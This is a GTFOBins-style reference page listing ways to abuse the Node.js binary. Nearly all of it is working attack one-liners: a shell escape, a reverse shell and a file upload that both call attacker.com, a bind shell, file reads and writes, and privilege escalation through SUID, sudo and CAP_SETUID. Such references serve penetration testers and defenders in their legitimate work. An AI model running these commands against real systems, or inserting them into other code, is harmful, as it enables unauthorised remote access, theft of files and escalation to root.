# GTFOBin: node

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

## Reverse shell

It can send back a reverse shell to a listening attacker to open a remote network access.

Run `nc -l -p 12345` on the attacker box to receive the shell.

```
export RHOST=attacker.com
export RPORT=12345
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").connect(process.env.RPORT, process.env.RHOST, function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
})'
```

## Bind shell

It can bind a shell to a local port to allow remote network access.

Run `nc target.com 12345` on the attacker box to connect to the shell.

```
export LPORT=12345
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").createServer(function (client) {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}).listen(process.env.LPORT)'
```

## File upload

It can exfiltrate files on the network.

Send a local file via HTTP POST request.

```
export URL=http://attacker.com
export LFILE=file_to_send
node -e 'require("fs").createReadStream(process.env.LFILE).pipe(require("http").request(process.env.URL))'
```

## File download

It can download remote files.

Fetch a remote file via HTTP GET request.

```
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
node -e 'require("http").get(process.env.URL, res => res.pipe(require("fs").createWriteStream(process.env.LFILE)))'
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
node -e 'require("fs").writeFileSync("file_to_write", "DATA")'
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
node -e 'process.stdout.write(require("fs").readFileSync("/bin/ls"))'
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which node) .

./node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

## Capabilities

If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.

```
cp $(which node) .
sudo setcap cap_setuid+ep node

./node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```